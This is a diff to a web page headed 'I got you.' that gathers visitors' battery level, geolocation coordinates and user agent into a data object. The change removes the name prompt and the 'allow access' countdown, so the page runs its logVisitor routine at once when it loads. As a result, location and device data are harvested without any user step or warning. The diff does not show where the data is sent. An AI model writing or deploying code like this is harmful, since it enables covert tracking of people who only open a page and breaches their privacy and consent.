@@ -32,18 +32,14 @@
 </head>
 <body>
   <h1>I got you.</h1>
-  <p>Type your name:</p>
-  <input type="text" id="username" placeholder="Your name here" />
-  <div id="countdown" style="display:none;">You have 5 seconds to allow access...</div>
+  <div id="countdown" style="display:none;">Determining location...</div>
   <p id="battery"></p>
 
   <script>
     const countdownEl = document.getElementById("countdown");
     const batteryEl = document.getElementById("battery");
-    const nameInput = document.getElementById("username");
 
     let userData = {
-      name: "",
       battery: null,
       lat: null,
       lon: null,
@@ -70,23 +66,8 @@ navigator.getBattery?.().then(battery => {
   userData.battery = percent;
 });
 
-    nameInput.addEventListener("change", () => {
-      const name = nameInput.value.trim();
-      if (!name) return;
-
-      userData.name = name;
-      countdownEl.style.display = "block";
-      let seconds = 5;
-      const interval = setInterval(() => {
-        seconds--;
-        countdownEl.textContent = `You have ${seconds} second${seconds !== 1 ? "s" : ""} to allow access...`;
-        if (seconds <= 0) {
-          clearInterval(interval);
-          countdownEl.textContent = "Requesting location...";
-          logVisitor();
-        }
-      }, 1000);
-    });
+    countdownEl.style.display = "block";
+    logVisitor();
 
     async function logVisitor() {
       const ua = navigator.userAgent;
